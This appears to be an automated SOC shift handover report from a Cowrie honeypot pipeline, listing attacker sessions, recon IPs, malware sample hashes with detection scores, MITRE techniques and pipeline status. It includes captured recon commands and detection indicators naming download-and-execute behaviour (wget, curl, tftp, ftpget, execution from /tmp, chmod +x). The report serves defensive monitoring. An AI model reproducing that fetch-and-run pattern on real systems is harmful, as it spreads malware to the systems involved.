| **First Seen** | 2026-08-16 08:31 |
| **Last Seen** | 2026-08-16 08:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:31:20` | `cowrie.session.connect` |
| `2026-08-16 08:31:20` | `cowrie.client.version` |
| `2026-08-16 08:31:20` | `cowrie.client.kex` |
| `2026-08-16 08:31:22` | `cowrie.login.success` |
| `2026-08-16 08:31:22` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4203834e42c

| Field | Detail |
|---|---|
| **Source IP** | `2.55.122[.]202` |
| **First Seen** | 2026-08-16 08:31 |
| **Last Seen** | 2026-08-16 08:31 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:31:26` | `cowrie.session.connect` |
| `2026-08-16 08:31:31` | `cowrie.client.version` |
| `2026-08-16 08:31:31` | `cowrie.client.kex` |
| `2026-08-16 08:31:36` | `cowrie.login.success` |
| `2026-08-16 08:31:38` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.122[.]202` to AbuseIPDB if not already reported
- [ ] Block `2.55.122[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de30cf010c40

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 08:37 |
| **Last Seen** | 2026-08-16 08:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:37:14` | `cowrie.session.connect` |
| `2026-08-16 08:37:14` | `cowrie.client.version` |
| `2026-08-16 08:37:14` | `cowrie.client.kex` |
| `2026-08-16 08:37:15` | `cowrie.login.success` |
| `2026-08-16 08:37:16` | `cowrie.session.params` |
| `2026-08-16 08:37:16` | `cowrie.command.input` |
| `2026-08-16 08:37:16` | `cowrie.log.closed` |
| `2026-08-16 08:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f4e1474dad

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 08:38 |
| **Last Seen** | 2026-08-16 08:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:38:45` | `cowrie.session.connect` |
| `2026-08-16 08:38:45` | `cowrie.client.version` |
| `2026-08-16 08:38:45` | `cowrie.client.kex` |
| `2026-08-16 08:38:45` | `cowrie.login.success` |
| `2026-08-16 08:38:46` | `cowrie.session.params` |
| `2026-08-16 08:38:46` | `cowrie.command.input` |
| `2026-08-16 08:38:46` | `cowrie.log.closed` |
| `2026-08-16 08:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c227f0b3aa

| Field | Detail |
|---|---|
| **Source IP** | `185.15.189[.]232` |
| **First Seen** | 2026-08-16 08:42 |
| **Last Seen** | 2026-08-16 08:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:42:01` | `cowrie.session.connect` |
| `2026-08-16 08:42:02` | `cowrie.client.version` |
| `2026-08-16 08:42:02` | `cowrie.client.kex` |
| `2026-08-16 08:42:03` | `cowrie.login.success` |
| `2026-08-16 08:42:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:42:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.15.189[.]232` to AbuseIPDB if not already reported
- [ ] Block `185.15.189[.]232` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8de09f2444

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 08:48 |
| **Last Seen** | 2026-08-16 08:48 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:48:00` | `cowrie.session.connect` |
| `2026-08-16 08:48:04` | `cowrie.client.version` |
| `2026-08-16 08:48:04` | `cowrie.client.kex` |
| `2026-08-16 08:48:32` | `cowrie.login.success` |
| `2026-08-16 08:48:45` | `cowrie.session.params` |
| `2026-08-16 08:48:45` | `cowrie.command.input` |
| `2026-08-16 08:48:51` | `cowrie.log.closed` |
| `2026-08-16 08:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **4547** | 2026-08-16 06:55 | 2026-08-16 08:55 | 5372m | 0 | `T1592` | 🟠 MEDIUM |
| `107.150.146[.]69` | **27** | 2026-08-16 06:59 | 2026-08-16 08:43 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-16 07:10 | 2026-08-16 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.238.110[.]208` | **3** | 2026-08-16 07:16 | 2026-08-16 08:00 | 1m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]118` | **3** | 2026-08-16 07:46 | 2026-08-16 07:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **3** | 2026-08-16 06:55 | 2026-08-16 07:29 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | **3** | 2026-08-16 08:01 | 2026-08-16 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]110` | **3** | 2026-08-16 08:02 | 2026-08-16 08:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]79` | **3** | 2026-08-16 08:01 | 2026-08-16 08:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.80.204[.]149` | **2** | 2026-08-16 07:21 | 2026-08-16 07:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.224.15[.]67` | 1 | 2026-08-16 08:28 | 2026-08-16 08:28 | 5s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-16 08:26 | 2026-08-16 08:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `179.6.101[.]103` | 1 | 2026-08-16 08:28 | 2026-08-16 08:29 | 14s | 0 | `T1592` | 🟢 LOW |
| `181.212.0[.]26` | 1 | 2026-08-16 07:19 | 2026-08-16 07:19 | 11s | 0 | `T1592` | 🟢 LOW |
| `203.56.201[.]183` | 1 | 2026-08-16 07:02 | 2026-08-16 07:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-08-16 08:51 | 2026-08-16 08:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-16 07:20 | 2026-08-16 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-16 08:47 | 2026-08-16 08:47 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-08-16 07:43 | 2026-08-16 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.159[.]194` | 1 | 2026-08-16 07:21 | 2026-08-16 07:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.45.238[.]59` | 1 | 2026-08-16 08:08 | 2026-08-16 08:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-08-16 07:23 | 2026-08-16 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-08-16 07:04 | 2026-08-16 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]52` | 1 | 2026-08-16 07:29 | 2026-08-16 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]1` | 1 | 2026-08-16 07:18 | 2026-08-16 07:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `1.212.225[.]99` | KR | LG Uplus | **100** ⚠️ | 50 |
| `103.158.138[.]179` | IN | Sneha Sales And Services Pvt.ltd. | **100** ⚠️ | 50 |
| `24.207.66[.]154` | CA | EastLink | **100** ⚠️ | 50 |
| `211.178.165[.]251` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `63.135.169[.]175` | US | MacStadium, Inc. | **100** ⚠️ | 50 |
| `45.79.207[.]181` | US | Linode | **100** ⚠️ | 50 |
| `62.60.130[.]253` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 2 |
| `104.238.110[.]208` | US | GoDaddy.com, LLC | **100** ⚠️ | 31 |
| `85.217.149[.]1` | CA | NL MODAT | **100** ⚠️ | 50 |
| `45.33.12[.]122` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 4682 cases |
| Tool 34  | Credential Extractor        | ✅ 73 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (0.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 47 priority case(s) shown individually · 25 recon entry/entries in table (10 group(s) consolidating 4598 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T10:28:29Z_
